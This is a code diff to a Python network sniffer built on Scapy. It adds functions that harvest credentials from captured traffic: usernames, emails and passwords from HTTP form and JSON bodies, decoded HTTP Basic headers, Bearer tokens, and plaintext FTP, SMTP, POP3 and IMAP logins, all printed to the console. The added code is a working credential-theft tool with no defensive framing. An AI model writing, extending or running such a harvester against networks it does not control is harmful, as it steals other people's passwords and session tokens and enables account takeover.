@@ -266,14 +266,24 @@ def process_sniffed_packet(packet, show_raw: bool) -> None:
     if packet.haslayer(http.HTTPRequest):
         print(f"{Fore.BLUE}[+] HTTP REQUEST >>>>>{Style.RESET_ALL}")
         url_extractor(packet)
+
+        # Structured credential extraction (form data, JSON, auth headers)
+        harvest_credentials(packet)
+
+        # Fallback: raw keyword match for anything the structured parser missed
         login_data = get_login_info(packet)
         if login_data:
-            print(f"{Fore.GREEN}[+] Credentials found >>> {login_data}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[+] Possible credentials >>> {login_data}{Style.RESET_ALL}")
+
         if show_raw:
             raw_http_request(packet)
 
+    # --- Plaintext protocol credentials (FTP, SMTP, POP3, IMAP) ---
+    if packet.haslayer(TCP) and packet.haslayer(Raw):
+        harvest_plaintext_creds(packet)
+
     # --- TCP SYN (only when show_raw is enabled) ---
-    elif show_raw and packet.haslayer(TCP):
+    if show_raw and packet.haslayer(TCP):
         tcp = packet[TCP]
         if tcp.flags == 'S' and packet.haslayer(IP):
             src = packet[IP].src
@@ -293,6 +303,177 @@ def get_login_info(packet) -> str | None:
             if keyword in load_decode:
                 return load_decode
     return None
+
+
+# ---------------------------------------------------------------------------
+# Credential harvesting — structured extraction from captured packets
+# ---------------------------------------------------------------------------
+
+# Field names commonly used in login/signup forms (case-insensitive match)
+_USERNAME_FIELDS = {
+    "username", "user", "login", "user_name", "user_login", "nick",
+    "nickname", "uname", "usr", "accountname", "account",
+}
+_EMAIL_FIELDS = {
+    "email", "mail", "e-mail", "emailaddress", "email_address",
+    "user_email", "useremail",
+}
+_PASSWORD_FIELDS = {
+    "password", "pass", "passwd", "pwd", "user_password", "userpassword",
+    "pass_word", "secret", "passphrase",
+}
+
+
+def _parse_form_data(body: str) -> dict[str, str]:
+    """Parse a URL-encoded form body (key=val&key=val) into a dict."""
+    from urllib.parse import unquote_plus
+    pairs: dict[str, str] = {}
+    for part in body.split('&'):
+        if '=' in part:
+            k, v = part.split('=', 1)
+            pairs[unquote_plus(k)] = unquote_plus(v)
+    return pairs
+
+
+def _parse_json_data(body: str) -> dict | None:
+    """Try to parse *body* as JSON; return dict or None."""
+    import json
+    body = body.strip()
+    if not body.startswith('{'):
+        return None
+    try:
+        data = json.loads(body)
+        if isinstance(data, dict):
+            return data
+    except (json.JSONDecodeError, ValueError):
+        pass
+    return None
+
+
+def _extract_credentials(fields: dict[str, str]) -> dict[str, str]:
+    """Pull username, email, and password values from a dict of form/JSON fields."""
+    creds: dict[str, str] = {}
+    for key, value in fields.items():
+        key_lower = key.lower().strip()
+        if not value or not value.strip():
+            continue
+        if key_lower in _USERNAME_FIELDS:
+            creds["username"] = value
+        elif key_lower in _EMAIL_FIELDS:
+            creds["email"] = value
+        elif key_lower in _PASSWORD_FIELDS:
+            creds["password"] = value
+    return creds
+
+
+def _format_credentials(creds: dict[str, str], source: str) -> str:
+    """Format extracted credentials for display."""
+    parts = []
+    if "username" in creds:
+        parts.append(f"User: {Fore.WHITE}{creds['username']}{Fore.GREEN}")
+    if "email" in creds:
+        parts.append(f"Email: {Fore.WHITE}{creds['email']}{Fore.GREEN}")
+    if "password" in creds:
+        parts.append(f"Pass: {Fore.RED}{creds['password']}{Fore.GREEN}")
+    if not parts:
+        return ""
+    return f"{Fore.GREEN}[CREDS {source}] {' | '.join(parts)}{Style.RESET_ALL}"
+
+
+def harvest_credentials(packet) -> None:
+    """Extract and display login/signup credentials from a captured packet.
+
+    Checks for:
+    - URL-encoded POST form data (application/x-www-form-urlencoded)
+    - JSON POST bodies ({email: ..., password: ...})
+    - HTTP Basic / Bearer Authorization headers
+    """
+    if not packet.haslayer(Raw):
+        return
+
+    load = packet[Raw].load.decode('utf-8', errors='ignore')
+    src_ip = packet[IP].src if packet.haslayer(IP) else '?'
+
+    # --- 1. URL-encoded form data (most common for HTTP login forms) ---
+    if '=' in load and '&' in load:
+        fields = _parse_form_data(load)
+        creds = _extract_credentials(fields)
+        if creds:
+            print(_format_credentials(creds, f"HTTP Form | {src_ip}"))
+            return
+
+    # --- 2. JSON login payloads ---
+    json_data = _parse_json_data(load)
+    if json_data:
+        str_fields = {k: str(v) for k, v in json_data.items() if v is not None}
+        creds = _extract_credentials(str_fields)
+        if creds:
+            print(_format_credentials(creds, f"JSON API | {src_ip}"))
+            return
+
+    # --- 3. HTTP Authorization header (Basic / Bearer) ---
+    if packet.haslayer(http.HTTPRequest):
+        http_layer = packet[http.HTTPRequest]
+        auth = None
+        if hasattr(http_layer, 'Authorization') and http_layer.Authorization:
+            auth = http_layer.Authorization
+            if isinstance(auth, bytes):
+                auth = auth.decode('utf-8', errors='ignore')
+
+        if auth:
+            if auth.lower().startswith('basic '):
+                import base64
+                try:
+                    decoded = base64.b64decode(auth[6:]).decode('utf-8', errors='ignore')
+                    if ':' in decoded:
+                        user, passwd = decoded.split(':', 1)
+                        print(f"{Fore.GREEN}[CREDS HTTP Basic | {src_ip}] "
+                              f"User: {Fore.WHITE}{user}{Fore.GREEN} | "
+                              f"Pass: {Fore.RED}{passwd}{Style.RESET_ALL}")
+                        return
+                except Exception:
+                    pass
+            elif auth.lower().startswith('bearer '):
+                token = auth[7:].strip()
+                print(f"{Fore.GREEN}[CREDS Bearer Token | {src_ip}] "
+                      f"Token: {Fore.WHITE}{token[:40]}{'...' if len(token) > 40 else ''}"
+                      f"{Style.RESET_ALL}")
+                return
+
+
+def harvest_plaintext_creds(packet) -> None:
+    """Detect plaintext credentials in FTP, SMTP, POP3, and IMAP traffic."""
+    if not packet.haslayer(TCP) or not packet.haslayer(Raw) or not packet.haslayer(IP):
+        return
+
+    tcp = packet[TCP]
+    load = packet[Raw].load.decode('utf-8', errors='ignore').strip()
+    src = packet[IP].src
+    dport = tcp.dport
+
+    # FTP (port 21)
+    if dport == 21:
+        if load.upper().startswith('USER '):
+            print(f"{Fore.GREEN}[CREDS FTP | {src}] User: {Fore.WHITE}{load[5:]}{Style.RESET_ALL}")
+        elif load.upper().startswith('PASS '):
+            print(f"{Fore.GREEN}[CREDS FTP | {src}] Pass: {Fore.RED}{load[5:]}{Style.RESET_ALL}")
+
+    # SMTP (port 25, 587)
+    elif dport in (25, 587):
+        if load.upper().startswith('AUTH LOGIN') or load.upper().startswith('AUTH PLAIN'):
+            print(f"{Fore.GREEN}[CREDS SMTP Auth | {src}] {Fore.WHITE}{load}{Style.RESET_ALL}")
+
+    # POP3 (port 110)
+    elif dport == 110:
+        if load.upper().startswith('USER '):
+            print(f"{Fore.GREEN}[CREDS POP3 | {src}] User: {Fore.WHITE}{load[5:]}{Style.RESET_ALL}")
+        elif load.upper().startswith('PASS '):
+            print(f"{Fore.GREEN}[CREDS POP3 | {src}] Pass: {Fore.RED}{load[5:]}{Style.RESET_ALL}")
+
+    # IMAP (port 143)
+    elif dport == 143:
+        if ' LOGIN ' in load.upper():
+            print(f"{Fore.GREEN}[CREDS IMAP | {src}] {Fore.WHITE}{load}{Style.RESET_ALL}")
 
 
 def url_extractor(packet) -> None:
